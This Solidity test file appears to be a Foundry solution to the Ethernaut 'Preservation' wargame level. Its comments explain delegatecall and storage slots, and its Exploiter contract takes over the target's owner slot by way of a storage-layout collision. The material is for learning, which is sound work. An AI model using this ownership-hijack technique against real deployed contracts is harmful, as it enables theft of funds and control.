// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Preservation.sol";
import "src/levels/PreservationFactory.sol";

contract TestPreservation is BaseTest {
    Preservation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PreservationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // This one is a complex one
        // First of all you need to remember how the `delegatecall` function works.
        // Second of all you need to remember how the contract storage layout works
        // And last some solidity knowledge about the address type and how it can be casted

        // delegatecall -> it's a special function that allow contract A to call an implementation method on contract B but
        // using the contract A "context"
        // What does it mean?
        // That the delegatecall will execute a function in B code but the storage (read/write) is from contract A
        // and B `msg.sender` is not the caller (contract A) but the contract A caller
        // More info here:
        // - https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries
        // - https://solidity-by-example.org/delegatecall
        // - https://solidity-by-example.org/hacks/delegatecall

        // contract storage layout
        // I've already explained this but in a contract storage each variable take an entire slot (256 bits)
        // if they cannot be packed togheter
        // In this case slot0 -> timeZone1Library | slot1 -> timeZone2Library | slot2 -> owner | slot3 -> storedTime
        // why is important to know it?
        // Because as we said `delegatecall` use the caller's context, so when the `LibraryContract` will modify the `storedTime` variable
        // it will modify that variable in the Preservation contract and not in the LibraryContract
        // And this would be totally fine but only if the library/delegated contract have the SAME storage layout as the caller
        // In this case `LibraryContract` is updating the `slot0` slot of `Preservation` contract that is not the `storedTime` variable
        // but the `timeZone1Library` address variable itself!

        // What if we could replace that address with another contract address and when our contract will be called we are going to
        // replace the `owner` slot address (because also our contract will be called via a delegatecall)?

        // To do so we need to transform cast our Exploiter address to a uint256
        // After doing so, calling `level.setFirstTime` will call `exploiter.setTime` that in our implementation
        // is going to cast the `_time` uint256 back to an address replacing the `Preservation`'s `owner` with the
        // player address (that have been converted earlier to a uint256)

        Exploiter exploiter = new Exploiter();

        level.setFirstTime(uint256(address(exploiter)));
        level.setFirstTime(uint256(player));

        vm.stopPrank();

        assertEq(level.owner(), player);
    }
}

contract Exploiter {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(time);
    }
}
